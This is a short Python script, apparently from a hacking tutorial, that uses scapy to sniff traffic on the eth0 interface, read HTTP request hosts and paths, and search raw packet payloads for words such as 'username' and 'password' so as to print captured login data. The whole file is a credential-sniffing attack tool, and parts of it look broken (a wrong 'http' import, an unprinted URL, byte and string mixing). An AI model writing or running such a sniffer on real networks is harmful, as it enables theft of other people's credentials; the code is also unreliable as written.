#!/usr/bin/env python
import scapy.all as scapy
import scapy.layers
import http

def sniff(interface):
	scapy.sniff(iface=interface , store=False, prn=process_sniffed_packet)
def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keywords = ["username" , "email" , "password" , "pass"]
		for keyword in keywords:
			if keyword in load:
				return load
def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP Request URL >>" )
	login_info = get_login_info(packet)
	if login_info:
		print("\n\n [+] Possible username and password >>" + login_info + "\n\n" )

sniff("eth0")
